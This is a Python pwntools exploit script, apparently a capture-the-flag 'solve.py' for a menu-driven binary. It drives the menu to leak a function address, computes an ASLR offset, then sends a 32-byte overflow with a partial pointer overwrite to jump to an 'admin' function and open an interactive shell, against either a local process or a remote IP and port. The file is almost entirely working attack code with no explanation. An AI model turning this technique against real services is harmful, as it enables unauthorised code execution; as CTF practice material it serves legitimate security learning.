#!/bin/python

from sys import argv, exit
from pwn import ELF, context, gdb, p64, process, remote, u64


def pwn(p: remote | process):
    base_hackingue = 0x1371
    admin = 0x127A

    # ---[leak ASLR]---
    p.sendlineafter(b"Exit\n> ", b"1")
    p.recv()
    p.sendline(b"i3")
    p.recv()
    p.sendline(b"linux")
    p.recv()
    p.sendline(b"128go")

    p.sendlineafter(b"Exit\n> ", b"2")

    p.recvuntil(b"Exit\n> ")
    p.sendline(b"3")

    p.sendline(b"")

    p.recvuntil(b"Exit\n> ")
    p.sendline(b"4")

    leakded = u64(p.recvuntil(b"\nQue")[32:40])
    debug(f"hackingue: {hex(leakded)}")

    offset = leakded - base_hackingue
    debug(f"offset: {hex(offset)}")

    # ---[shell]---
    p.recvuntil(b"Exit\n> ")
    p.sendline(b"1")
    p.recv()
    p.sendline(b"i3")
    p.recv()
    p.sendline(b"linux")
    p.recv()
    p.sendline(b"128go")

    p.recvuntil(b"Exit\n> ")
    p.sendline(b"2")

    p.recvuntil(b"Exit\n> ")
    p.sendline(b"3")

    payload = b"A" * 32 + p64(admin + offset)[:-1]
    p.sendline(payload)

    p.sendline(b"2")

    p.interactive()

    return


def info(s: str):
    print(f"[i] {s}")


def ok(s: str):
    print(f"[+] {s}")


def debug(s: str):
    print(f"\\___{{ {s}")


if __name__ == "__main__":
    try:
        mode = argv[1]
        if mode == "remote" or mode == "r":
            p = remote(argv[2], argv[3])

        elif mode == "local" or mode == "l":
            p = process(argv[2])

            bin = ELF(argv[2])

            debug(hex(bin.symbols.hackingue))
            debug(hex(bin.symbols.win))

        elif mode == "debug" or mode == "d":
            context.terminal = (
                "kitten @ launch --location=before --cwd=current --bias=65".split()
            )

            p = gdb.debug(argv[2], "b main", env={"SHELL": "/bin/bash"})

        else:
            raise ValueError("wrong arguments")

        pwn(p)

    except (IndexError, ValueError):
        print(
            "Usage : python solve.py remote <ip> <port> or python solve.py local <program_name>"
        )
        exit(1)
